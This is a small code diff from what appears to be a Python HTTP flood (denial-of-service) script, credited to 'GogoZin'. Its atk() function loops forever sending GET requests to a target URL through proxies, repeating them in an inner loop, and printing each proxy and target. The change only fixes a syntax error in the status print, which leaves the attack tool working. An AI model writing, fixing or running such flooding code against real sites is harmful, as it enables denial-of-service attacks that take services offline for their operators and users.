@@ -83,7 +83,7 @@ def atk():
 	while True:
 		try:
 			s.get(url)
-			print(Fore.GREEN + "From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] "Fore.GREEN + " Target-> " + Fore.WHITE + str(url)) #Code By GogoZin
+			print(Fore.GREEN + "From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.GREEN + " Target-> " + Fore.WHITE + str(url)) #Code By GogoZin
 			try:
 				for y in range(pow):
 					s.get(url)
